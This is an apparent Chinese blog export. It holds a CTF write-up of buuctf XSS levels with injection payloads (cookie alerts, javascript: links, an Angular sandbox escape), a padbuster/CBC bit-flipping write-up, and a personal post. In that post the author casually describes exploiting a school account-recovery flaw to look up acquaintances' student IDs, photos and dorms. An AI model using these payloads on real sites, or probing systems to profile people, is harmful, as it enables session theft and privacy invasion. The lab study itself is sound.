class="hljs-string">&quot;;alert(document.cookie);//</span><br><span class="hljs-string">http://xsst.sinapp.com/example/1-2.php?page=&quot;</span>;alert<span class="hljs-built_in">(document</span>.cookie);<br></code></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">$</span>(<span class="hljs-params">str</span>)&#123;<br><span class="hljs-keyword">if</span>(!<span class="hljs-regexp">/^#[^&#x27;]+&quot;[^&quot;]+&quot;\]/</span>.<span class="hljs-title function_">test</span>(str))&#123;    <span class="hljs-comment">//额 &quot; &lt;  &gt;被过滤</span><br><span class="hljs-keyword">throw</span> <span class="hljs-string">&quot;error&quot;</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">var</span> page=$(<span class="hljs-string">&#x27;#test a[href=&quot;1&quot;]&#x27;</span>);<br><span class="hljs-keyword">var</span> page=$(<span class="hljs-string">&#x27;#test a[href=&quot;&quot;]&#x27;</span>);<span class="hljs-title function_">alert</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>);<span class="hljs-keyword">var</span> a=$(<span class="hljs-string">&#x27;#test a[href=&quot;1&quot;]&#x27;</span>);<br><span class="hljs-string">&quot;]&#x27;);alert(document.cookie);var a=$(&#x27;#test a[href=&quot;</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><h2 id="Dom-based的反射型XSS"><a href="#Dom-based的反射型XSS" class="headerlink" title="Dom-based的反射型XSS"></a>Dom-based的反射型XSS</h2><h1 id="简单实战-buuctf-web进阶-XSS闯关"><a href="#简单实战-buuctf-web进阶-XSS闯关" class="headerlink" title="简单实战: [buuctf web进阶]XSS闯关"></a>简单实战: [buuctf web进阶]XSS闯关</h1><h2 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h2><p>查看源码，发现无任何过滤(源码里没有js代码)，输入即可弹窗</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script&gt;<span class="hljs-title function_">alert</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>)&lt;/script&gt;<br></code></pre></td></tr></table></figure><h2 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h2><p>查看源码，username被escape函数过滤过(escape函数: 就是把函数url编码)</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script type=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;<br>    <span class="hljs-keyword">if</span>(location.<span class="hljs-property">search</span> == <span class="hljs-string">&quot;&quot;</span>)&#123;<br>location.<span class="hljs-property">search</span> = <span class="hljs-string">&quot;?username=xss&quot;</span><br>   &#125;<br><span class="hljs-keyword">var</span> username = <span class="hljs-string">&#x27;7bmk&#x27;</span>;<br><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;ccc&#x27;</span>).<span class="hljs-property">innerHTML</span>= <span class="hljs-string">&quot;Welcome &quot;</span> + <span class="hljs-built_in">escape</span>(username);<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>那要咋闭合捏？&lt;&gt;&#x2F;()都被转化为url，可以这样构造，产生闭合var username&#x3D;’’里的’’和后面的&lt;&#x2F; script&gt;: </p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?u</span>sername=<span class="hljs-string">&#x27;;alert(document.cookie);//</span><br></code></pre></td></tr></table></figure><h2 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h2><p>查看源码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script type=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;<br><span class="hljs-keyword">if</span>(location.<span class="hljs-property">search</span> == <span class="hljs-string">&quot;&quot;</span>)&#123;<br>location.<span class="hljs-property">search</span> = <span class="hljs-string">&quot;?username=xss&quot;</span><br>&#125;<br><span class="hljs-keyword">var</span> username = <span class="hljs-string">&#x27;xss&#x27;</span>;<br><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;ccc&#x27;</span>).<span class="hljs-property">innerHTML</span>= <span class="hljs-string">&quot;Welcome &quot;</span> + username;<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>这不和上一关没区别吗，相同payload试试，发现引号被过滤了: </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script type=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;<br><span class="hljs-keyword">if</span>(location.<span class="hljs-property">search</span> == <span class="hljs-string">&quot;&quot;</span>)&#123;<br>location.<span class="hljs-property">search</span> = <span class="hljs-string">&quot;?username=xss&quot;</span><br>&#125;<br>    <span class="hljs-keyword">var</span> username = <span class="hljs-string">&#x27;\&#x27;;alert(document.cookie);//&#x27;</span>;<br><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;ccc&#x27;</span>).<span class="hljs-property">innerHTML</span>= <span class="hljs-string">&quot;Welcome &quot;</span> + username;<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>但是，这个只过滤了1个引号，而不是在所有的引号前加...这我就匪夷所思啊，谁在做网站防护时会这么防…. 还只转义1个引号不转义其他的…</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">username</span>=<span class="hljs-string">&#x27;&#x27;</span><span class="hljs-comment">;alert(1);//</span><br></code></pre></td></tr></table></figure><h2 id="第四关-伪链接"><a href="#第四关-伪链接" class="headerlink" title="第四关(伪链接)"></a>第四关(伪链接)</h2><p>页面每10s重定向1次，通过禁用js停止跳转，然后查看源代码: </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script type=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;<br><span class="hljs-keyword">var</span> time = <span class="hljs-number">10</span>;<br><span class="hljs-keyword">var</span> jumpUrl;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_">getQueryVariable</span>(<span class="hljs-string">&#x27;jumpUrl&#x27;</span>) == <span class="hljs-literal">false</span>)&#123; <span class="hljs-comment">//getQueryVariable()用于获取url参数</span><br>jumpUrl = location.<span class="hljs-property">href</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>jumpUrl = <span class="hljs-title function_">getQueryVariable</span>(<span class="hljs-string">&#x27;jumpUrl&#x27;</span>);<br>&#125;<br><span class="hljs-built_in">setTimeout</span>(jump,<span class="hljs-number">1000</span>,time);<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">jump</span>(<span class="hljs-params">time</span>)&#123;<br><span class="hljs-keyword">if</span>(time == <span class="hljs-number">0</span>)&#123;<br>location.<span class="hljs-property">href</span> = jumpUrl;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>time = time - <span class="hljs-number">1</span> ;<br><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;ccc&#x27;</span>).<span class="hljs-property">innerHTML</span>= <span class="hljs-string">`页面<span class="hljs-subst">$&#123;time&#125;</span>秒后将会重定向到<span class="hljs-subst">$&#123;<span class="hljs-built_in">escape</span>(jumpUrl)&#125;</span>`</span>;<br><span class="hljs-built_in">setTimeout</span>(jump,<span class="hljs-number">1000</span>,time);<br>&#125;<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">getQueryVariable</span>(<span class="hljs-params">variable</span>)&#123;<br>    <span class="hljs-keyword">var</span> query = <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">search</span>.<span class="hljs-title function_">substring</span>(<span class="hljs-number">1</span>);<br>        <span class="hljs-keyword">var</span> vars = query.<span class="hljs-title function_">split</span>(<span class="hljs-string">&quot;&amp;&quot;</span>);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i=<span class="hljs-number">0</span>;i&lt;vars.<span class="hljs-property">length</span>;i++) &#123;<br>           <span class="hljs-keyword">var</span> pair = vars[i].<span class="hljs-title function_">split</span>(<span class="hljs-string">&quot;=&quot;</span>);<br>           <span class="hljs-keyword">if</span>(pair[<span class="hljs-number">0</span>] == variable)&#123;<span class="hljs-keyword">return</span> pair[<span class="hljs-number">1</span>];&#125;<br>&#125;<br><span class="hljs-keyword">return</span>(<span class="hljs-literal">false</span>);<br>&#125;<br>&lt;script&gt;<br></code></pre></td></tr></table></figure><p>这关的知识点是伪链接:<br>javascript:alert(1)，浏览器会把javascript后面的那一段内容当做代码，直接在当前页面执行。<br>于是payload: </p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">jumpUrl</span>=javascript:alert(<span class="hljs-number">1</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>困惑: 我怎么知道get传的参是jumpUrl呢? 当然是通过getQueryVariable(): getQueryVariable()用于获取url参数</p><h2 id="第五关"><a href="#第五关" class="headerlink" title="第五关"></a>第五关</h2><p>查看源码: </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script type=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_">getQueryVariable</span>(<span class="hljs-string">&#x27;autosubmit&#x27;</span>) !== <span class="hljs-literal">false</span>)&#123;  <span class="hljs-comment">//参数autosubmit必须要有，且要经过getQueryVariable的过滤</span><br><span class="hljs-keyword">var</span> autoForm = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;autoForm&#x27;</span>);    <span class="hljs-comment">//啊...类似字典吧，id是html的标签的标志....还是滚去学html吧</span><br>autoForm.<span class="hljs-property">action</span> = (<span class="hljs-title function_">getQueryVariable</span>(<span class="hljs-string">&#x27;action&#x27;</span>) == <span class="hljs-literal">false</span>) ? location.<span class="hljs-property">href</span> : <span class="hljs-title function_">getQueryVariable</span>(<span class="hljs-string">&#x27;action&#x27;</span>);<span class="hljs-comment">//还是看wp吧...这说明，先学完技巧后，还要学基础</span><br>autoForm.<span class="hljs-title function_">submit</span>();<br>&#125;<br>    <span class="hljs-keyword">else</span>&#123;&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">getQueryVariable</span>(<span class="hljs-params">variable</span>)&#123;<br>       <span class="hljs-keyword">var</span> query = <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">search</span>.<span class="hljs-title function_">substring</span>(<span class="hljs-number">1</span>);  <span class="hljs-comment">//获得当前页面get请求的指定参数(?后的部分，为1字符串)</span><br>       <span class="hljs-keyword">var</span> vars = query.<span class="hljs-title function_">split</span>(<span class="hljs-string">&quot;&amp;&quot;</span>);<br>       <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i=<span class="hljs-number">0</span>;i&lt;vars.<span class="hljs-property">length</span>;i++) &#123;<br>               <span class="hljs-keyword">var</span> pair = vars[i].<span class="hljs-title function_">split</span>(<span class="hljs-string">&quot;=&quot;</span>);<br>               <span class="hljs-keyword">if</span>(pair[<span class="hljs-number">0</span>] == variable)&#123;<span class="hljs-keyword">return</span> pair[<span class="hljs-number">1</span>];&#125;<br>       &#125;<br>       <span class="hljs-keyword">return</span>(<span class="hljs-literal">false</span>);<br>&#125;<br>&lt;script&gt;<br></code></pre></td></tr></table></figure><p>不难，审就完事了(所以里面的POST压根毫无关系就是来混淆的是吗…)</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">autosubmit</span>=1&amp;action=javascript:alert(1);<br></code></pre></td></tr></table></figure><h2 id="第六关-angular沙箱逃逸"><a href="#第六关-angular沙箱逃逸" class="headerlink" title="第六关(angular沙箱逃逸)"></a>第六关(angular沙箱逃逸)</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script text=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;<br>    <span class="hljs-keyword">if</span>(location.<span class="hljs-property">search</span> == <span class="hljs-string">&quot;&quot;</span>)&#123;<br>        location.<span class="hljs-property">search</span> = <span class="hljs-string">&quot;?username=xss&quot;</span><br>    &#125;<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>嗯….这关的过滤没有在源代码里写，然后显示的方式是在html里而8是js，所以没法执行alert…个p<br>搜索script关键字，发现有个main.js文件</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript">_alert = alert;<br>alert = <span class="hljs-keyword">function</span>(<span class="hljs-params">info</span>)&#123;<br><span class="hljs-title function_">_alert</span>(<span class="hljs-string">&quot;过关成功！进入下一关！&quot;</span>);<br><span class="hljs-keyword">var</span> current_level = location.<span class="hljs-property">pathname</span>.<span class="hljs-title function_">match</span>(<span class="hljs-regexp">/level([0-9]+)/</span>)[<span class="hljs-number">1</span>];<span class="hljs-comment">//额。。。。匹配到的第一个</span><br><span class="hljs-keyword">var</span> next_level = <span class="hljs-built_in">parseInt</span>(current_level) + <span class="hljs-number">1</span>;<br>location.<span class="hljs-property">href</span> = <span class="hljs-string">&quot;/level&quot;</span> + next_level;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后看球不懂，实际上这玩意也没啥卵用…</p><p>实际上突破点在源码里的另一处链接: <a href="https://cdn.staticfile.org/angular.js/1.4.6/angular.min.js">https://cdn.staticfile.org/angular.js/1.4.6/angular.min.js</a><br>是一个angular 1.4.6框架</p><h2 id="参考-angular-1-6沙箱逃逸"><a href="#参考-angular-1-6沙箱逃逸" class="headerlink" title="参考: angular 1.6沙箱逃逸"></a>参考: angular 1.6沙箱逃逸</h2><p><a href="https://xz.aliyun.com/t/4638">参考链接</a><br>angular是1个前端框架，在Angular1.6以前的版本，有很多绕过方式，而在这之后的版本，沙箱已被删除，为此也就8存在沙箱逃逸了</p><h3 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h3><p>对于angular 1.6以下的版本，输入20，若返回的结果为20，则存在漏洞</p><h3 id="逃逸"><a href="#逃逸" class="headerlink" title="逃逸"></a>逃逸</h3><p>payload:</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;a&#x27;.constructor.prototype.charAt</span>=[].join;$eval(<span class="hljs-name">&#x27;x=1&#125; &#125; &#125;;alert(1)//&#x27;</span>);&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>其中的alert(1)可被其他payload替换</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>基础</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>如何凭实力被刚认识的女生拉黑</title>
    <link href="/2022/05/30/sh1t/"/>
    <url>/2022/05/30/sh1t/</url>
    
    <content type="html"><![CDATA[<p>由于事件过于蛋疼，你可能会以为这是我编的</p><span id="more"></span><p>总之事件过于蛋疼，以及从这件事中我获得了深刻的教训，于是我决定把这个离谱的事件记录下来以此来警示自己</p><h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>起因是，在一些dlc以及周围的兄弟都陆续脱单后，👴也在表白墙发了个征友<br><img src="/images/%E8%A1%A8%E6%83%85%E5%8C%85/%E5%85%88%E8%BE%88.png"></p><p>然后由于👴的直男属性基本只用了不到1天就和这些人把天全部聊死了，达成了速通成就，比拼刀还快。事故就发生在其中1位身上，下面以我的视角来回顾一下整个事件</p><h2 id="坑点"><a href="#坑点" class="headerlink" title="坑点"></a>坑点</h2><p>为了防骚扰，我选择了放小号，如果有人加我再大号加回去，看似和直接放大号一样没啥区别，但正是这个为后来的事故挖下了坑</p><p>在发了征友2天后，有天去登小号，发现有人来加，于是点了同意，然后大号加回去，一切看似正常</p><p>然后，凭借直男属性👴发动了技能：尬聊，妹子也不知咋回，就已读乱回<br><img src="/images/wtf/%E5%B0%AC%E8%81%8A.jpg"></p><h2 id="发现不对劲"><a href="#发现不对劲" class="headerlink" title="发现不对劲"></a>发现不对劲</h2><p>本来这也没什么，按正常发展，无非就是尬聊，对方失去耐心<del>并认为这人是不是有什么大病</del>，拉黑，在这个过程中慢慢构造payload，提高情商。问题是我没按规矩来</p><p>由于学点web，外加平时稍微注意观察，可以找出一点小bug：通过学校某些网站的申请找回账号机制，可以根据姓名获得1个人的学号\性别，根据学号区间，可以判断出年级、专业等更多信息。</p><p>当然这只是其中1个没啥卵用的小bug，由于个人感觉只是套取一下学号<del>(和他入学照片、宿舍号啥的)</del>，并不是什么很严重的搜集，因此在新认识1个校友后有时会顺手试一下。</p><p>于是我试着找了一下，然后惊讶地发现，结果分析显示，隔着屏幕和我聊天的，是1个19级的电信类大哥<br><img src="/images/%E8%A1%A8%E6%83%85%E5%8C%85/%E9%9C%87%E6%83%8A.gif"></p><h2 id="离大谱"><a href="#离大谱" class="headerlink" title="离大谱"></a>离大谱</h2><p>虽然不知道现在有没有变化，但是通过入学照，至少可以判断出他大一的时候，长得比较草率…<br>结合到西电连食堂的筷子都是弯的的gay含量，我顿时惊出一身冷汗<br><img src="/images/%E8%A1%A8%E6%83%85%E5%8C%85/%E8%AE%A9%E6%88%91%E5%BA%B7%E5%BA%B7.jfif"><br>或者是其他可能性：名字是假的，对面是某个👴认识的究极无聊的兄弟在钓🐟搞我</p><h2 id="抉择"><a href="#抉择" class="headerlink" title="抉择"></a>抉择</h2><p>于是到了这里，不管出于哪个可能，对方都撒谎了，为啥1个人要主动加我然后撒谎呢？为此我想找更多信息<br>但是我发现对方的很多信息都没法判断真假，所以短时间没法知道对方身份</p><p>选项:<br>A: 继续周旋，尝试套话以获取信息<br>B: 直接问他是什么意思，加速剧情发展</p><p>由于感觉没必要对陌生人花费精力，于是直接选择了选项B，加速剧情发展，然后👴糗大了</p><h2 id="真相-巧合"><a href="#真相-巧合" class="headerlink" title="真相: 巧合"></a>真相: 巧合</h2><p>为了不暴露，我一开始还是以学妹称呼的<br><img src="/images/wtf/%E5%BC%80%E7%9B%92(1).jpg"></p><p>然后…….前方高能反转了</p><p><img src="/images/wtf/%E5%BC%80%E7%9B%92(2).jpg"><br><img src="/images/%E8%A1%A8%E6%83%85%E5%8C%85/%E9%9C%87%E6%83%8A.gif"><br>这下轮到我不会了，这tm是个什么情况?<br><img src="/images/wtf/%E5%BC%80%E7%9B%92(3).jpg"><br>这妹子….什么时候说过自己是师大的?<br><img src="/images/wtf/%E5%BC%80%E7%9B%92(4).jpg"></p><p>我到这里才反应过来：这个妹子是陕师大的，在和我发征友差不多的时间里也发了个征友，先加了我小号，而我拿大号加回了她，于是造成了一场误会</p><h3 id="对方视角"><a href="#对方视角" class="headerlink" title="对方视角"></a>对方视角</h3><p>她以为我的大号是通过她发的征友加她的，于是默认我知道她是陕师大大一的,也默认我知道这是她小号</p><p>(事实上我压根没看到那个征友，而是在她加我后用大号加回了她)</p><h3 id="我的视角"><a href="#我的视角" class="headerlink" title="我的视角"></a>我的视角</h3><p>而我不知道她也发了征友，在大号加了她后就默认她是西电的(毕竟👴是在本校发的征友，她也没说自己是师大的)</p><p>也默认她知道我大号和小号是同一个人(毕竟2个号连头像都是一样的，这还用得着解释吗)<br><img src="/images/wtf/qq.jpg"></p><h3 id="第三个巧合，车祸现场"><a href="#第三个巧合，车祸现场" class="headerlink" title="第三个巧合，车祸现场"></a>第三个巧合，车祸现场</h3><p>于是在默认她是个西电学生的前提下，我手痒顺手查了一下信息，然后第三个巧合就是西电里正好有个和她叫一样名字的同学，而且他是个19级的学长，👴当时就傻眼了<br><img src="/images/%E8%A1%A8%E6%83%85%E5%8C%85/%E9%9C%87%E6%83%8A.jpg"></p><p>于是在3个巧合下，不是上帝视角的我彻底懵逼了，谁tm能想到第4种可能性啊。由于懒得在1个陌生人身上花时间，便没有选择沉住气继续问，而是直接拆身份牌。</p><h3 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h3><p>这样做的好处呢，就是提前真相大白了，坏处呢，自然就是好处的补集</p><p><img src="/images/wtf/%E6%8B%89%E9%BB%91.jpg"><br>成功达成了”加好友不到6小时就被女生女生拉黑”的成就。</p><h2 id="教训"><a href="#教训" class="headerlink" title="教训"></a>教训</h2><p>经过这件事情，本人思来想去，寝食难安，我从中获得的领悟，对我的意义，不能不说非常重大，带着这些问题，我们来审视一下，从中获得的感悟，那就是:<br><img src="/images/%E8%A1%A8%E6%83%85%E5%8C%85/%E4%B8%AD%E6%8C%87.jpg"><br>去他🐎的脱单</p>]]></content>
    
    
    <categories>
      
      <category>随记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>随记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Th1s_summer_特殊dlc的启发_0x01</title>
    <link href="/2022/05/20/Th1s_summer_dlc_0x01/"/>
    <url>/2022/05/20/Th1s_summer_dlc_0x01/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="930a4fc27d382c01bcdd2bb8502ca98b8b46d98948b9979f541e22be0e7217ae"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">笔者自己看的 (h1nt：牢大，我想你了(╥﹏╥))</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>随记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>随记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>miniL_ctf</title>
    <link href="/2022/05/11/miniL-ctf/"/>
    <url>/2022/05/11/miniL-ctf/</url>
    
    <content type="html"><![CDATA[<p>挖个坑，等复盘，最近实验太多了</p><span id="more"></span><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="checkin-CBC字节翻转攻击-kali-padbuster"><a href="#checkin-CBC字节翻转攻击-kali-padbuster" class="headerlink" title="checkin -CBC字节翻转攻击&amp;kali-padbuster"></a>checkin -CBC字节翻转攻击&amp;kali-padbuster</h2><p>进入页面，抓包，目的是伪造token使自己身份成为vip，给出了源码，加密是AES-CBC加密<br>现学了go的gin框架，AES加密，然后没做出来…..<br>赛后复盘<br>看了看wp，可以用kali里现成的工具padbuster<br>原文来自: <a href="https://zing.gitbooks.io/kali-lunix/content/06x/6x18_PadBuster.html">kali工具使用中文说明书</a></p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-section">:~# 破坏者</span><br><span class="hljs-section">+-----</span><br>---------------------------------------+<br>| PadBuster - v0.3.3 |<br>| Brian Holyfield - Gotham 数字科学 |<br>|<br><br><span class="hljs-section">                     |</span><br><span class="hljs-section">+--------------------------------------------+</span><br><span class="hljs-code">  使用：padBuster.pl URL EncryptedSample BlockSize [选项]</span><br>其中： URL = 目标 URL（如果适用，还有查询字符串）<br><span class="hljs-code">       EncryptedSample = 您要测试的加密值。必须</span><br><span class="hljs-code">                         也存在于 URL、PostData 或 Cookie 中</span><br><span class="hljs-code">       BlockSize = 算法使用的块大小</span><br>选项：<br><span class="hljs-code">   -auth [用户名：密码]：HTTP 基本身份验证</span><br><span class="hljs-code">   -bruteforce：对第一个块执行蛮力</span><br><span class="hljs-code">   -ciphertext [Bytes]：中间字节的密文（十六进制编码）</span><br><span class="hljs-code">       -cookies [HTTP Cookies]: Cookies (name1=value1; name2=value2)</span><br><span class="hljs-code">       -encoding [0-4]：样本的编码格式（默认0）</span><br><span class="hljs-code">                        0=Base64，1=下十六进制，2=上十六进制</span><br><span class="hljs-code">                        3=.NET UrlToken，4=WebSafe Base64</span><br><span class="hljs-code">       -encodedtext [编码字符串]：要加密的数据（编码）</span><br><span class="hljs-code">       -error [错误字符串]：填充错误消息</span><br><span class="hljs-code">       -headers [HTTP 标头]：自定义标头 (name1::value1;name2::value2)</span><br><span class="hljs-code">   -interactive：提示确认解密字节</span><br><span class="hljs-code">   -intermediate [Bytes]：密文的中间字节（十六进制编码）</span><br><span class="hljs-code">   -log：生成日志文件（创建文件夹 PadBuster.DDMMYY）</span><br><span class="hljs-code">   -noencode：不对负载进行 URL 编码（默认编码）</span><br><span class="hljs-code">   -noiv：样本不包括 IV（解密第一个块）</span><br><span class="hljs-code">       -plaintext [String]：要加密的纯文本</span><br><span class="hljs-code">       -post [发布数据]：HTTP 发布数据字符串</span><br><span class="hljs-code">   -prefix [Prefix]：附加到每个样本的前缀字节（编码）</span><br><span class="hljs-code">   -proxy [地址：端口]：使用 HTTP/S 代理</span><br><span class="hljs-code">   -proxyauth [用户名：密码]：代理身份验证</span><br><span class="hljs-code">   -resume [Block Number]：在这个block number处恢复</span><br><span class="hljs-code">   -usebody：使用响应正文内容进行响应分析阶段</span><br><span class="hljs-code">       -verbose：要详细</span><br><span class="hljs-code">       -veryverbose：非常详细（仅限调试）</span><br></code></pre></td></tr></table></figure><h3 id="密码学的一点科普"><a href="#密码学的一点科普" class="headerlink" title="密码学的一点科普"></a>密码学的一点科普</h3><p><a href="https://baijiahao.baidu.com/s?id=1651159916892970446">密码学的科普</a></p><p>块加密: 就是把密文分成块，再加密(不够的补全)<br>ECB: 最早的加密，由于所有的分组的加密方式都一致，因此难以抵挡统计分析攻击，易被破解<br>CBC: 每个明文块先与前一个密文块进行异或后，再进行加密,每个密文块都依赖于它前面的所有明文块。同时，为了保证每条消息的唯一性，在第一个块中需要使用初始化向量IV(第一明文块M1加密的时候，因为前面没有加密的密文，所以需要与一个初始化向量（IV）进行XOR（异或）)<br>OFM: 